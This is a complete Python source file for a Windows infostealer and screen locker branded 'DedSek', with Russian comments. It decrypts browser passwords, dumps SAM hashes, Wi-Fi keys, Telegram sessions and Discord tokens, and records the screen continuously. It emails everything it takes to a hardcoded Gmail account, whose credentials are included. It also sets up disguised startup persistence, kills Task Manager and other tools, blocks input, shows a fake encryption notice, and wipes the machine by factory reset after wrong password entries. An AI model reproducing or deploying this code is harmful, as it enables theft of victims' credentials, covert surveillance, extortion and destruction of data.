import ctypes
import os
import sys
import time
import threading
import tempfile
import tkinter as tk
from tkinter import PhotoImage, scrolledtext
import shutil
import winshell
from win32com.client import Dispatch
import base64
import random
import socket
import subprocess
import json
import urllib.request
import urllib.parse
import smtplib
import imaplib
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2
import numpy as np
from PIL import ImageGrab
import sqlite3
import winreg
import zipfile
import win32crypt
import re

# Попытка импорта cryptography для Firefox
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except:
    CRYPTO_AVAILABLE = False

# ============================================================
# >>> НАСТРОЙКИ <<<
PASSWORD = "1601"
MAX_ATTEMPTS = 4
TIMER_SECONDS = 10
SKULL_BASE64 = "YOUR_BASE64_STRING_HERE"

GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
# ============================================================

attempts_left = MAX_ATTEMPTS

# ========== СКРЫТИЕ CMD ==========
def hide_console():
    try:
        if sys.executable.endswith("python.exe"):
            pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
            if os.path.exists(pythonw_path):
                subprocess.Popen([pythonw_path, __file__] + sys.argv[1:], creationflags=0x08000000)
                os._exit(0)
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.FreeConsole()
    except:
        pass

# ========== БЛОКИРОВКА WIN ==========
def disable_win_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def restore_win_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except:
        pass

# ========== РАСШИФРОВКА FIREFOX ==========
def decrypt_firefox_3des(encrypted_data, key, iv):
    try:
        backend = default_backend()
        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=backend)
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(encrypted_data) + decryptor.finalize()
        padding_len = decrypted[-1]
        return decrypted[:-padding_len]
    except:
        return None

def extract_asn1_data(data):
    try:
        if len(data) < 2:
            return None, None, None, None
        if data[0] != 0x30:
            return None, None, None, None
        
        length = data[1]
        offset = 2
        if length & 0x80:
            num_bytes = length & 0x7F
            length = 0
            for i in range(num_bytes):
                length = (length << 8) | data[offset + i]
            offset += num_bytes
        
        seq_data = data[offset:offset + length]
        seq_offset = 0
        
        while seq_offset < len(seq_data):
            tag = seq_data[seq_offset]
            seq_offset += 1
            item_len = seq_data[seq_offset]
            seq_offset += 1
            item_data = seq_data[seq_offset:seq_offset + item_len]
            seq_offset += item_len
            
            if tag == 0x04:
                return None, None, None, item_data
            elif tag == 0x30:
                inner_offset = 0
                iv = None
                ciphertext = None
                
                while inner_offset < len(item_data):
                    inner_tag = item_data[inner_offset]
                    inner_offset += 1
                    inner_len = item_data[inner_offset]
                    inner_offset += 1
                    inner_data = item_data[inner_offset:inner_offset + inner_len]
                    inner_offset += inner_len
                    
                    if inner_tag == 0x04:
                        iv = inner_data
                    elif inner_tag == 0x02:
                        pass
                
                if iv:
                    # После IV идёт ciphertext
                    remaining = item_data[inner_offset:]
                    if remaining and remaining[0] == 0x04:
                        ct_len = remaining[1]
                        ciphertext = remaining[2:2+ct_len]
                    elif remaining:
                        ciphertext = remaining
                
                return iv, ciphertext, None, None
        
        return None, None, None, None
    except:
        return None, None, None, None

def decrypt_firefox_profile(profile_path):
    result = []
    try:
        logins_file = os.path.join(profile_path, 'logins.json')
        key4_file = os.path.join(profile_path, 'key4.db')
        
        if not os.path.exists(logins_file) or not os.path.exists(key4_file):
            return result
        
        with open(logins_file, 'r', encoding='utf-8') as f:
            logins_data = json.load(f)
        
        conn = sqlite3.connect(key4_file)
        cursor = conn.cursor()
        
        cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
        row = cursor.fetchone()
        if not row:
            conn.close()
            return result
        
        global_salt = row[0]
        encrypted_key = row[1]
        
        cursor.execute("SELECT a11, a102 FROM nssPrivate")
        row = cursor.fetchone()
        if not row:
            conn.close()
            return result
        
        a11 = row[0]
        a102 = row[1]
        
        iv, ciphertext, _, _ = extract_asn1_data(encrypted_key)
        key = None
        
        if iv and ciphertext and a102 and len(a102) >= 24:
            try:
                key = decrypt_firefox_3des(ciphertext, a102[:24], iv)
            except:
                pass
        
        for login in logins_data.get('logins', []):
            hostname = login.get('hostname', 'Unknown')
            username = "ERROR"
            password = "ERROR"
            
            try:
                enc_user = base64.b64decode(login['encryptedUsername'])
                iv_u, ct_u, _, _ = extract_asn1_data(enc_user)
                if iv_u and ct_u and key:
                    dec = decrypt_firefox_3des(ct_u, key, iv_u)
                    if dec:
                        username = dec.decode('utf-8', errors='ignore').strip('\x00').strip()
            except:
                pass
            
            try:
                enc_pass = base64.b64decode(login['encryptedPassword'])
                iv_p, ct_p, _, _ = extract_asn1_data(enc_pass)
                if iv_p and ct_p and key:
                    dec = decrypt_firefox_3des(ct_p, key, iv_p)
                    if dec:
                        password = dec.decode('utf-8', errors='ignore').strip('\x00').strip()
            except:
                pass
            
            result.append(f"FIREFOX | {hostname} | {username} | {password}")
        
        conn.close()
    except:
        pass
    
    return result

# ========== КРАЖА CHROMIUM ПАРОЛЕЙ ==========
def steal_chromium_passwords(browser_name, paths):
    result = []
    for login_path in paths:
        if not os.path.exists(login_path):
            continue
        
        try:
            temp_db = os.path.join(tempfile.gettempdir(), f'{browser_name}_{random.randint(1000,9999)}.db')
            shutil.copy2(login_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                try:
                    password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode('utf-8', errors='ignore')
                    result.append(f"{browser_name} | {url} | {username} | {password}")
                except:
                    result.append(f"{browser_name} | {url} | {username} | ***")
            
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
        except:
            pass
    
    return result

# ========== ДАМП SAM ==========
def dump_sam():
    result = []
    try:
        sam_path = os.path.join(tempfile.gettempdir(), 'sam')
        sys_path = os.path.join(tempfile.gettempdir(), 'system')
        
        os.system(f'reg save HKLM\\SAM "{sam_path}" /y >nul 2>&1')
        os.system(f'reg save HKLM\\SYSTEM "{sys_path}" /y >nul 2>&1')
        
        if os.path.exists(sam_path) and os.path.getsize(sam_path) > 0:
            hash_zip = os.path.join(tempfile.gettempdir(), 'sam_dump.zip')
            with zipfile.ZipFile(hash_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(sam_path, 'sam')
                zf.write(sys_path, 'system')
            
            send_file_email(hash_zip, "SAM+SYSTEM Hash Dump")
            result.append(f"SAM+SYSTEM отправлены! Размер SAM: {os.path.getsize(sam_path)} байт")
            result.append("Расшифровка: impacket-secretsdump -sam sam -system system LOCAL")
            
            for f in [hash_zip, sam_path, sys_path]:
                try:
                    os.remove(f)
                except:
                    pass
        else:
            result.append("Нужен запуск от Администратора")
    except:
        result.append("Ошибка дампа SAM")
    
    return result

# ========== МЕГА-СТИЛЕР ==========
def mega_steal_data():
    try:
        R = []
        R.append("=" * 60)
        R.append("DEDSEK MEGA STEALER - ПОЛНЫЙ ОТЧЁТ")
        R.append("=" * 60)
        
        R.append("\n--- БАЗОВАЯ ИНФОРМАЦИЯ ---")
        R.append(f"Пользователь: {os.environ.get('USERNAME', 'Unknown')}")
        R.append(f"Компьютер: {socket.gethostname()}")
        
        R.append("\n--- IPCONFIG ---")
        try:
            ipconfig = subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
            R.append(ipconfig[:5000])
        except:
            pass
        
        R.append("\n--- IP / GEO ---")
        try:
            R.append(f"Локальный IP: {socket.gethostbyname(socket.gethostname())}")
        except:
            pass
        try:
            pub_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
            geo = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{pub_ip}", timeout=5).read())
            R.append(f"Внешний IP: {pub_ip}")
            R.append(f"Страна: {geo.get('country','?')} | Город: {geo.get('city','?')} | Провайдер: {geo.get('isp','?')}")
        except:
            pass
        
        R.append("\n--- WIFI ПАРОЛИ ---")
        try:
            wifi_out = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
            for line in wifi_out.split('\n'):
                if ':' in line and 'Все профили' in line:
                    p = line.split(':')[1].strip()
                    if p:
                        try:
                            det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
                            key = "НЕ НАЙДЕН"
                            for dl in det.split('\n'):
                                if 'Содержимое ключа' in dl or 'Key Content' in dl:
                                    key = dl.split(':')[1].strip()
                            R.append(f"WiFi: {p} | Пароль: {key}")
                        except:
                            pass
        except:
            pass
        
        R.append("\n" + "=" * 60)
        R.append("ПАРОЛИ БРАУЗЕРОВ (ПОЛНАЯ РАСШИФРОВКА)")
        R.append("=" * 60)
        
        # Chrome
        R.append("\n--- CHROME ---")
        cp = steal_chromium_passwords("CHROME", [
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        ])
        R.extend(cp if cp else ["Нет данных"])
        
        # Yandex
        R.append("\n--- YANDEX ---")
        yp = steal_chromium_passwords("YANDEX", [
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')
        ])
        R.extend(yp if yp else ["Нет данных"])
        
        # Opera
        R.append("\n--- OPERA ---")
        op = steal_chromium_passwords("OPERA", [
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Login Data'),
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Opera Software', 'Opera Stable', 'Login Data')
        ])
        R.extend(op if op else ["Нет данных"])
        
        # Edge
        R.append("\n--- EDGE ---")
        ep = steal_chromium_passwords("EDGE", [
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
        ])
        R.extend(ep if ep else ["Нет данных"])
        
        # Firefox
        R.append("\n--- FIREFOX ---")
        ff_base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
        if os.path.exists(ff_base):
            ff_found = False
            for folder in os.listdir(ff_base):
                pf = os.path.join(ff_base, folder)
                if os.path.exists(os.path.join(pf, 'logins.json')):
                    ff_found = True
                    if CRYPTO_AVAILABLE:
                        dec = decrypt_firefox_profile(pf)
                        if dec:
                            R.extend(dec)
                        else:
                            R.append(f"Профиль {folder}: не удалось расшифровать, отправляю файлы")
                            _send_firefox_files(pf, folder)
                    else:
                        R.append(f"Профиль {folder}: cryptography не установлен, отправляю файлы")
                        _send_firefox_files(pf, folder)
            if not ff_found:
                R.append("Нет данных")
        else:
            R.append("Firefox не найден")
        
        R.append("\n" + "=" * 60)
        R.append("ПАРОЛЬ WINDOWS")
        R.append("=" * 60)
        R.extend(dump_sam())
        
        # Telegram
        R.append("\n--- TELEGRAM ---")
        try:
            tg = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
            if os.path.exists(tg):
                _send_telegram(tg)
                R.append("Сессия Telegram отправлена!")
            else:
                R.append("Не найден")
        except:
            R.append("Ошибка")
        
        # Discord
        R.append("\n--- DISCORD ---")
        try:
            dc = os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb')
            if os.path.exists(dc):
                tokens = set()
                for f in os.listdir(dc):
                    if f.endswith('.ldb') or f.endswith('.log'):
                        try:
                            with open(os.path.join(dc, f), 'r', errors='ignore') as ff:
                                tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', ff.read()))
                        except:
                            pass
                if tokens:
                    for t in list(tokens)[:10]:
                        R.append(f"ТОКЕН: {t}")
                else:
                    R.append("Токены не найдены")
            else:
                R.append("Не найден")
        except:
            R.append("Ошибка")
        
        R.append("\n" + "=" * 60)
        R.append(f"ОТЧЁТ: {time.strftime('%d.%m.%Y %H:%M:%S')}")
        
        # Отправка
        text = '\n'.join(R)
        for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
            send_email(part, f"DedSek FULL [{i+1}]")
        
    except Exception as e:
        send_email(f"Ошибка стилера: {e}")

def _send_firefox_files(profile_path, folder_name):
    try:
        key4 = os.path.join(profile_path, 'key4.db')
        logins = os.path.join(profile_path, 'logins.json')
        if os.path.exists(key4) and os.path.exists(logins):
            z = os.path.join(tempfile.gettempdir(), f'firefox_{folder_name[:10]}.zip')
            with zipfile.ZipFile(z, 'w') as zf:
                zf.write(logins, 'logins.json')
                zf.write(key4, 'key4.db')
            send_file_email(z, f"Firefox {folder_name[:10]}")
            try:
                os.remove(z)
            except:
                pass
    except:
        pass

def _send_telegram(tg_path):
    try:
        z = os.path.join(tempfile.gettempdir(), 'telegram.zip')
        with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(tg_path):
                for file in files:
                    if file in ['key_datas', 'D877F783D5D3EF8C', 'settingss', 'maps'] or file.startswith('usertag') or file.startswith('data'):
                        try:
                            zf.write(os.path.join(root, file), file)
                        except:
                            pass
        send_file_email(z, "Telegram")
        try:
            os.remove(z)
        except:
            pass
    except:
        pass

def send_email(message, subject=None):
    try:
        if not subject:
            subject = f'DedSek - {os.environ.get("USERNAME", "Unknown")}'
        msg = MIMEText(message, 'plain', 'utf-8')
        msg['Subject'] = subject
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

def send_file_email(file_path, description):
    try:
        msg = MIMEMultipart()
        msg['Subject'] = f'Файл: {description}'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        with open(file_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
            msg.attach(part)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=60)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

# ========== ЗАПИСЬ ЭКРАНА ==========
def record_and_send_loop():
    while True:
        try:
            vp = os.path.join(tempfile.gettempdir(), f"scr_{int(time.time())}.avi")
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(vp, fourcc, 10.0, (1280, 720))
            for _ in range(150):
                img = ImageGrab.grab()
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
                out.write(cv2.resize(frame, (1280, 720)))
                time.sleep(0.1)
            out.release()
            _send_video(vp)
            try:
                os.remove(vp)
            except:
                pass
        except:
            time.sleep(1)

def _send_video(fp):
    try:
        if os.path.getsize(fp) > 20*1024*1024:
            try:
                out = fp.replace('.avi', '.mp4')
                subprocess.run(['ffmpeg', '-i', fp, '-c:v', 'libx264', '-preset', 'ultrafast', '-crf', '35', '-b:v', '200k', '-s', '640x360', '-r', '10', '-y', out], capture_output=True, timeout=30)
                fp = out
            except:
                pass
        msg = MIMEMultipart()
        msg['Subject'] = f'Видео - {os.environ.get("USERNAME", "Unknown")}'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="scr_{int(time.time())}.avi"')
            msg.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

# ========== ЧАТ ==========
class VictimChat:
    def __init__(self, locker_window):
        self.locker = locker_window
        self.chat_window = None
        
    def show(self):
        if self.chat_window:
            return
        self.chat_window = tk.Toplevel(self.locker.win)
        self.chat_window.geometry("380x480+60+60")
        self.chat_window.configure(bg='#00FF00')
        self.chat_window.attributes('-topmost', True)
        self.chat_window.overrideredirect(True)
        self.chat_window.focus_force()
        
        frame = tk.Frame(self.chat_window, bg='black', bd=2, relief='solid')
        frame.pack(fill='both', expand=True, padx=2, pady=2)
        
        header = tk.Frame(frame, bg='#00FF00')
        header.pack(fill='x')
        tk.Label(header, text="Чат DedSek", bg='#00FF00', fg='black', font=('Courier', 11, 'bold')).pack(side='left', padx=10, pady=5)
        tk.Button(header, text="✕", command=self.hide, bg='#FF0000', fg='white', font=('Courier', 12, 'bold'), bd=0, width=3, cursor='hand2').pack(side='right', padx=5, pady=3)
        
        self.history = scrolledtext.ScrolledText(frame, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), height=20, wrap=tk.WORD)
        self.history.pack(padx=10, pady=(0,5), fill='both', expand=True)
        self.history.config(state='disabled')
        
        inf = tk.Frame(frame, bg='black')
        inf.pack(padx=10, pady=(0,10), fill='x')
        self.entry = tk.Entry(inf, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), insertbackground='#00FF00', relief='solid', bd=1)
        self.entry.pack(side='left', fill='x', expand=True, ipady=3)
        self.entry.bind('<Return>', self.send_msg)
        tk.Button(inf, text="▶", command=self.send_msg, bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), width=3, cursor='hand2', relief='solid', bd=1).pack(side='right', padx=(5,0))
        
        header.bind('<Button-1>', self.start_drag)
        header.bind('<B1-Motion>', self.drag)
        
        self.add_msg("DedSek", "Привет! Твой ПК заблокирован.")
        self.check_incoming()
    
    def start_drag(self, e):
        self.x, self.y = e.x_root, e.y_root
    
    def drag(self, e):
        self.chat_window.geometry(f"+{self.chat_window.winfo_x()+e.x_root-self.x}+{self.chat_window.winfo_y()+e.y_root-self.y}")
        self.x, self.y = e.x_root, e.y_root
    
    def hide(self):
        if self.chat_window:
            self.chat_window.destroy()
            self.chat_window = None
        self.locker.win.focus_force()
        self.locker.pw_entry.focus_force()
    
    def send_msg(self, e=None):
        m = self.entry.get().strip()
        if m:
            self.add_msg("Ты", m)
            self.entry.delete(0, tk.END)
            send_email(f"Сообщение:\n\n{m}")
    
    def add_msg(self, sender, msg):
        self.history.config(state='normal')
        self.history.insert('end', f'[{sender}]: {msg}\n\n')
        self.history.see('end')
        self.history.config(state='disabled')
    
    def check_incoming(self):
        def _check():
            while True:
                if not self.chat_window:
                    break
                try:
                    mail = imaplib.IMAP4_SSL('imap.gmail.com')
                    mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
                    mail.select('inbox')
                    _, data = mail.search(None, 'SUBJECT "COMMAND:"', 'UNSEEN')
                    if data[0]:
                        for num in data[0].split():
                            _, msg_data = mail.fetch(num, '(RFC822)')
                            msg = email.message_from_bytes(msg_data[0][1])
                            if msg.is_multipart():
                                for part in msg.walk():
                                    if part.get_content_type() == "text/plain":
                                        cmd = part.get_payload(decode=True).decode()
                                        if cmd.startswith("MSG:"):
                                            if self.chat_window:
                                                self.chat_window.after(0, self.add_msg, "DedSek", cmd[4:])
                            mail.store(num, '+FLAGS', '\\Seen')
                    mail.close()
                    mail.logout()
                except:
                    pass
                time.sleep(5)
        threading.Thread(target=_check, daemon=True).start()

# ========== ОСТАЛЬНЫЕ ФУНКЦИИ ==========
def anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(0)
    except:
        pass

def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try:
                shutil.copy2(cp, pp)
            except:
                pass
            cp = pp
        sf = winshell.startup()
        sp = os.path.join(sf, "WindowsUpdate.lnk")
        sh = Dispatch('WScript.Shell')
        sc = sh.CreateShortCut(sp)
        sc.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")
        sc.Arguments = f'"{cp}"'
        sc.WorkingDirectory = os.path.dirname(cp)
        sc.IconLocation = "shell32.dll,13"
        sc.save()
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{cp}"')
            winreg.CloseKey(k)
        except:
            pass
    except:
        pass

def block_input(block=True):
    try:
        ctypes.windll.user32.BlockInput(block)
    except:
        pass

def block_all_keys():
    try:
        import keyboard
        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen','alt+print screen','left windows','right windows']:
            try:
                keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except:
                pass
        for k in ['windows','left windows','right windows','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause']:
            try:
                keyboard.block_key(k)
            except:
                pass
    except:
        pass

def kill_processes():
    kl = ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe","procmon.exe","processhacker.exe","wireshark.exe","ollydbg.exe","x64dbg.exe","x32dbg.exe"]
    while True:
        for p in kl:
            os.system(f"taskkill /f /im {p} >nul 2>&1")
        time.sleep(0.05)

def prevent_shutdown():
    try:
        ctypes.windll.user32.ShutdownBlockReasonCreate(ctypes.windll.kernel32.GetConsoleWindow(), "Windows Update...")
    except:
        pass

def full_windows_reset():
    try:
        restore_win_key()
        es = tk.Tk()
        es.attributes('-fullscreen', True)
        es.attributes('-topmost', True)
        es.configure(bg='black')
        es.overrideredirect(True)
        tk.Label(es, text="404 | ОШИБКА WINDOWS", bg='black', fg='#FF0000', font=('Courier', 40, 'bold')).pack(expand=True)
        tk.Label(es, text="КРИТИЧЕСКИЙ СБОЙ\nВСЕ ДАННЫЕ УНИЧТОЖАЮТСЯ...", bg='black', fg='#FF0000', font=('Courier', 20)).pack()
        es.update()
        time.sleep(5)
        es.destroy()
        os.system("taskkill /f /im explorer.exe >nul 2>&1")
        os.system("systemreset -factoryreset")
        time.sleep(3)
        os.system("shutdown /r /t 0 /f")
        os._exit(0)
    except:
        os.system("shutdown /r /t 0 /f")
        os._exit(0)

def boot_animation():
    a = tk.Tk()
    a.attributes('-fullscreen', True)
    a.attributes('-topmost', True)
    a.configure(bg='black')
    a.overrideredirect(True)
    disable_win_key()
    l = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 20, 'bold'))
    l.pack(expand=True)
    for i in range(8):
        a.configure(bg='white' if i%2==0 else 'black')
        l.config(bg='white' if i%2==0 else 'black', fg='black' if i%2==0 else 'white')
        a.update()
        time.sleep(0.2)
    a.configure(bg='black')
    l.config(bg='black', fg='#00FF00')
    a.attributes('-alpha', 0)
    for alpha in range(0, 110, 5):
        a.attributes('-alpha', alpha/100)
        l.config(text="DedSek тебя взломал")
        a.update()
        time.sleep(0.03)
    time.sleep(1.5)
    for msg in ["Идёт шифровка...","[                    ] 0%","[####                ] 20%","[########            ] 40%","[############        ] 60%","[################    ] 80%","[####################] 100%","","ДАННЫЕ ЗАШИФРОВАНЫ!"]:
        l.config(text=msg)
        a.update()
        time.sleep(0.25)
    time.sleep(1)
    a.destroy()

class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        
        global attempts_left
        
        try:
            img_data = base64.b64decode(SKULL_BASE64)
            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
            with open(img_path, "wb") as f:
                f.write(img_data)
            img = PhotoImage(file=img_path)
            tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.05, anchor='center')
            self.win._img = img
        except:
            pass
        
        msg = f"""ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!

ДУМАЕШЬ, ЧТО ЗНАЕШЬ ПАРОЛЬ? НЕТ!

1. standard DES
$1$rjBkQ1jG$zqthRBo7xAfA4TTwBRhHv/

2. Bcrypt
$2y$10$/yFT/ZN1yJkgm4.8pSzTPOkhhEXOJC3H.gbs09EvKawKS3zz8Wf4e

3. Base64
MTI0Njk4ODA0

4. standard DES
$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1

5. uuEncode
+.3@P-C

УДАЧИ. У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ!"""
        
        tk.Label(self.win, text=msg, bg='black', fg='#00FF00', font=('Courier', 9, 'bold'), justify='left').place(relx=0.5, rely=0.42, anchor='center')
        
        self.chat = VictimChat(self)
        self.chat_open = False
        self.chat_btn = tk.Button(self.win, text="ЧАТ", command=self.toggle_chat, bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), cursor='hand2', bd=1, width=6)
        self.chat_btn.place(relx=0.95, rely=0.08, anchor='ne')
        
        cf = tk.Frame(self.win, bg='black')
        cf.place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00', font=('Courier', 14, 'bold')).pack(pady=(0,5))
        self.pw_entry = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='black', fg='#00FF00', insertbackground='#00FF00', relief='solid', bd=2)
        self.pw_entry.pack(pady=(0,5), ipadx=40, ipady=3)
        self.status_lbl = tk.Label(cf, text=f"ОСТАЛОСЬ ПОПЫТОК: {attempts_left}", bg='black', fg='#FF0000', font=('Courier', 12, 'bold'))
        self.status_lbl.pack()
        self.pw_entry.bind('<Return>', self.check_password)
        self.pw_entry.focus_force()
        self._keep_focus()
    
    def toggle_chat(self):
        if self.chat_open:
            self.chat.hide()
            self.chat_open = False
            self.chat_btn.config(text="ЧАТ")
        else:
            self.chat.show()
            self.chat_open = True
            self.chat_btn.config(text="[✕]")
    
    def _keep_focus(self):
        try:
            self.win.focus_force()
            self.pw_entry.focus_force()
            self.win.after(100, self._keep_focus)
        except:
            pass
    
    def check_password(self, e=None):
        global attempts_left
        if self.pw_entry.get() == PASSWORD:
            restore_win_key()
            self.status_lbl.config(text="ВЕРНО!", fg='#00FF00')
            self.win.update()
            time.sleep(1)
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0:
                self.status_lbl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='#FF0000')
            else:
                self.status_lbl.config(text="404 | ОШИБКА", fg='#FF0000')
                self.win.update()
                time.sleep(2)
                self.root.destroy()
                full_windows_reset()
            self.pw_entry.delete(0, tk.END)

# ========== ТОЧКА ВХОДА ==========
if __name__ == "__main__":
    hide_console()
    anti_debug()
    disable_win_key()
    threading.Thread(target=mega_steal_data, daemon=True).start()
    threading.Thread(target=record_and_send_loop, daemon=True).start()
    add_to_startup()
    time.sleep(TIMER_SECONDS)
    boot_animation()
    block_input(True)
    prevent_shutdown()
    threading.Thread(target=kill_processes, daemon=True).start()
    threading.Thread(target=block_all_keys, daemon=True).start()
    WinLocker()
    tk.mainloop()
